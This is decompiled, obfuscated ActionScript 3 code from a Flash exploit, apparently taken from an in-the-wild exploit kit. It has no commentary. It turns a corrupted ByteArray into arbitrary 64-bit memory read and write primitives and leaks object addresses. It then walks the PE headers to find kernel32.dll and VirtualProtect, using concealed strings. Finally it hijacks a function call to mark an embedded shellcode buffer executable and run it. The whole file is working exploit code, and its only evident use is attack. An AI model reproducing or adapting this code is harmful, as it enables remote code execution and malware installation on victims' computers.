package
{
   import flash.system.Capabilities;
   import flash.utils.Endian;
   
   public class §\x1e\r§
   {
       
      
      private const §\x15§:uint = 100;
      
      private var §\x14§:Vector.<uint>;
      
      private var §\x13§:§\x1e\x1a§;
      
      private var §\x12§:§\x1e\x1c§;
      
      private var §\x11§:§\x1e\x19§;
      
      private var §\x10§:§\x1e\x19§;
      
      private var data26:§\x1e\x19§;
      
      private var §\x0f§:§\x1e\x19§;
      
      private var §\x0e§:§\x1e\x19§;
      
      private var §\r§:§\x1e\x19§;
      
      private var §\f§:§\x1e\x19§;
      
      private var §\x0b§:§\x1e\x19§;
      
      private var §\n§:§\x1e\x19§;
      
      private var §\t§:§\x1e\x19§;
      
      public function §\x1e\r§(param1:§\x1e\x1c§, param2:§\x1e\x1a§)
      {
         this.§\x14§ = new Vector.<uint>(4096);
         super();
         this.§\x13§ = param2;
         this.§\x12§ = param1;
      }
      
      static function flash1000(param1:uint = 0, ... rest) : *
      {
      }
      
      public function flash30() : *
      {
         this.§\x11§ = new §\x1e\x19§(this.§\x12§.a26,this.§\x12§.a27);
         if(false)
         {
            return;
         }
         this.§\x12§.a26 = this.§\x12§.a50 + 44 * 4 - 1;
         this.§\x12§.a27 = this.§\x12§.a51;
         this.flash34(new §\x1e\x19§(0,0));
         this.§\x1e\x14§(4294967295);
         §§push(this);
         if(false)
         {
            throw true;
         }
         §§pop().§\x13§.endian = Endian.LITTLE_ENDIAN;
         this.flash32();
         this.§\x1e\x10§();
         this.§\x12§.a26 = this.§\x11§.lo;
         this.§\x12§.a27 = this.§\x11§.hi;
      }
      
      public function §\x1e\x15§(vt:Object) : §\x1e\x19§
      {
         §§push(this.§\x1e\x13§(vt));
         §§push(Capabilities.isDebugger);
         if(false)
         {
            return;
         }
         var _loc2_:§\x1e\x19§ = §§pop().flash24(!§§pop()?uint(48):uint(56));
         _loc2_ = this.flash36(_loc2_);
         var flash27:uint = 0;
         while(flash27 < 50 && this.flash37(_loc2_.flash24(flash27)) != vt[0])
         {
            flash27 = flash27 + 4;
         }
         if(flash27 >= 50)
         {
            if(false)
            {
               return;
            }
            throw new Error("");
         }
         return _loc2_.flash24(flash27);
      }
      
      private function flash32() : void
      {
         §§push(this);
         §§push(this);
         §§push(this.§\x1e\x13§(this.§\x13§));
         if(false)
         {
            return;
         }
         §§pop().§\x0f§ = §§pop().flash36(§§pop());
         var pe:§\x1e\x0f§ = new §\x1e\x0f§(this);
         var flash_addr:§\x1e\x19§ = pe.flash27(this.§\x0f§);
         §§push(pe);
         §§push("k" + §\x06\x07\x06\x07§.§\b\t\b\t§(12) + "n" + "e" + §\x06\x07\x06\x07§.§\b\t\b\t§(21));
         if(false)
         {
            return;
         }
         var kernel32:§\x1e\x19§ = §§pop().flash28(§§pop() + §\x06\x07\x06\x07§.§\b\t\b\t§(2) + "l" + "l",flash_addr);
         §§push(this);
         §§push(pe);
         §§push("v" + §\x06\x07\x06\x07§.§\b\t\b\t§(19) + "u" + §\x06\x07\x06\x07§.§\b\t\b\t§(4) + "p" + §\x06\x07\x06\x07§.§\b\t\b\t§(27) + "t");
         if(false)
         {
            return false;
         }
         §§pop().§\x10§ = §§pop().flash29(§§pop() + §\x06\x07\x06\x07§.§\b\t\b\t§(10),kernel32);
         this.data26 = this.§\x1e\x15§(this.§\x14§);
      }
      
      public function §\x1e\x10§() : *
      {
         this.§\x0e§ = this.§\x1e\x13§(flash1000);
         §§push(this);
         §§push(this);
         §§push(this.§\x0e§);
         if(false)
         {
            return;
         }
         §§pop().§\r§ = §§pop().flash36(§§pop().flash24(16));
         this.§\f§ = this.flash36(this.§\r§.flash24(40));
         this.§\x0b§ = this.flash36(this.§\f§.flash24(8));
         this.§\n§ = this.flash36(this.§\x0b§.flash24(264));
         §§push(this);
         §§push(this);
         if(false)
         {
            return;
         }
         §§pop().§\t§ = §§pop().flash36(this.§\n§);
         for(var j:int = -2; j < 320; j++)
         {
            this.§\x14§[j + 2] = this.flash37(this.§\n§.flash24(j * 4));
         }
         §§push(322);
         if(false)
         {
            throw true;
         }
         var §\x1e\x0b§:int = §§pop();
         while(true)
         {
            §§push(§\x1e\x0b§);
            if(false)
            {
               break;
            }
            if(§§pop() >= 322 + 228 / 4)
            {
               §§push(this);
               §§push(this.data26.flash24(1288 + 48));
               if(false)
               {
                  return false;
               }
               §§pop().flash39(§§pop(),this.§\x10§);
               §§push(this);
               §§push(this.data26.flash24(8));
               §§push(this.data26.flash24(1288));
               if(false)
               {
                  throw true;
               }
               §§pop().flash39(§§pop(),§§pop());
               this.flash39(this.§\x0b§.flash24(264),this.data26.flash24(8));
               var arg1:§\x1e\x19§ = this.flash36(this.§\x0e§.flash24(56));
               §§push(this);
               if(false)
               {
                  throw true;
               }
               §§pop().flash39(this.§\x0e§.flash24(56),new §\x1e\x19§(this.§\x14§.length * 4,0));
               var arg2:§\x1e\x19§ = this.flash36(this.§\x0e§.flash24(64));
               this.flash39(this.§\x0e§.flash24(64),new §\x1e\x19§(64,0));
               §§push(new Array(65));
               if(false)
               {
                  return;
               }
               var args:* = §§pop();
               var argAddr:§\x1e\x19§ = this.§\x1e\x13§(args);
               §§push(this.flash36(argAddr));
               if(false)
               {
                  throw true;
               }
               var argval:* = §§pop();
               flash1000.apply(null,args);
               this.flash39(argAddr,argval);
               this.flash39(this.§\x0e§.flash24(56),arg1);
               if(false)
               {
                  return;
               }
               this.flash39(this.§\x0e§.flash24(64),arg2);
               §§push(this);
               §§push(this.§\x0b§);
               if(false)
               {
                  return;
               }
               §§pop().flash39(§§pop().flash24(264),this.§\n§);
               §§push(flash01.data15);
               if(false)
               {
                  return;
               }
               §§pop().position = 0;
               for(var s:uint = 0; s < flash01.data15.length; s = §§pop() + §§pop())
               {
                  this.§\x14§[56 / 4 + s / 4] = flash01.data15.readUnsignedInt();
                  §§push(s);
                  §§push(4);
                  if(false)
                  {
                     throw true;
                  }
               }
               §§push(this.flash39(this.data26.flash24(48),this.data26.flash24(56)));
               if(false)
               {
                  return;
               }
               §§pop();
               var xx:§\x1e\x19§ = this.flash36(this.§\n§);
               §§push(this);
               §§push(this.§\n§);
               if(false)
               {
                  return;
               }
               §§pop().flash39(§§pop(),this.data26);
               flash1000.apply(null,args);
               this.flash39(this.§\n§,xx);
               return;
            }
            this.§\x14§[§\x1e\x0b§] = this.flash37(this.§\t§.flash24((§\x1e\x0b§ - 322) * 4));
            §\x1e\x0b§++;
         }
         return false;
      }
      
      private function §\x1e\x14§(new_length:uint) : void
      {
         var key:uint = this.§\x12§.a48;
         if(false)
         {
            return;
         }
         this.§\x12§.a42 = new_length;
         this.§\x12§.a43 = new_length;
         §§push(this);
         if(false)
         {
            return false;
         }
         §§pop().§\x12§.a46 = this.§\x12§.a42 ^ key;
         this.§\x12§.a47 = this.§\x12§.a43 ^ key;
      }
      
      private function flash34(ptr:§\x1e\x19§) : void
      {
         var key:uint = this.§\x12§.a48;
         §§push(this);
         if(false)
         {
            return false;
         }
         §§pop().§\x12§.a40 = ptr.lo;
         this.§\x12§.a41 = ptr.hi;
         this.§\x12§.a45 = this.§\x12§.a40 ^ this.§\x12§.a41 ^ key;
      }
      
      public function flash37(addr:§\x1e\x19§) : uint
      {
         this.flash34(addr);
         this.§\x13§.position = 0;
         return this.§\x13§.readUnsignedInt();
      }
      
      public function flash35(addr:§\x1e\x19§) : uint
      {
         this.flash34(addr);
         this.§\x13§.position = 0;
         return this.§\x13§.readUnsignedShort();
      }
      
      public function §\x1e\x12§(addr:§\x1e\x19§, val:uint) : void
      {
         this.flash34(addr);
         this.§\x13§.position = 0;
         this.§\x13§.writeUnsignedInt(val);
      }
      
      public function flash36(addr:§\x1e\x19§) : §\x1e\x19§
      {
         var hi:* = undefined;
         var lo:uint = 0;
         if(false)
         {
            return;
         }
         this.flash34(addr);
         this.§\x13§.position = 0;
         lo = this.§\x13§.readUnsignedInt();
         §§push(this.§\x13§.readUnsignedInt());
         if(false)
         {
            return;
         }
         hi = §§pop();
         return new §\x1e\x19§(lo,hi);
      }
      
      public function flash39(addr:§\x1e\x19§, val:§\x1e\x19§) : void
      {
         this.flash34(addr);
         this.§\x13§.position = 0;
         this.§\x13§.writeUnsignedInt(val.lo);
         this.§\x13§.writeUnsignedInt(val.hi);
      }
      
      public function flash40(addr:§\x1e\x19§, length:uint = 0) : String
      {
         this.flash34(addr);
         this.§\x13§.position = 0;
         if(length != 0)
         {
            return this.§\x13§.readUTFBytes(length);
         }
         return this.§\x13§.readUTFBytes(this.§\x15§);
      }
      
      public function §\x1e\x13§(obj:Object) : §\x1e\x19§
      {
         this.§\x13§.a16 = obj;
         §§push();
         §§push(this.§\x12§.a52);
         if(false)
         {
            return;
         }
         return new §§pop().§\x1e\x19§(§§pop() - 1,this.§\x12§.a53);
      }
   }
}